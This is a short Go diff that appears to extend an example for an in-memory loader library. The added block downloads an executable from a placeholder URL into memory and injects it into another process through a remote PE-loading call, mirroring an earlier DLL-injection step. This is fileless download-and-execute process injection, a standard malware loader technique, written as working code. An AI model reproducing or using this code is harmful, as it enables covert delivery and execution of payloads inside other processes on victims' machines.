@@ -51,6 +51,20 @@ if err != nil {
 	return
 }
 log.Printf("[main] LoadDLLRemote succeeded")
+// same pattern for LoadPERemote()
+buff, err := net.DownloadToMemory("https://url.com/file.exe")
+if err != nil {
+	log.Printf("[main] failed to download PE: %v", err)
+	fmt.Println("failed to download", err)
+	return
+}
+_, err = pe.LoadPERemote(pHandle, buff)
+if err != nil {
+	log.Printf("[main] LoadPERemote failed: %v", err)
+	fmt.Println("failed to load", err)
+	return
+}
+log.Printf("[main] LoadPERemote succeeded")
 
 // check currently mapped dlls
 baseAddrs, sizes, count := pe.GetMap()
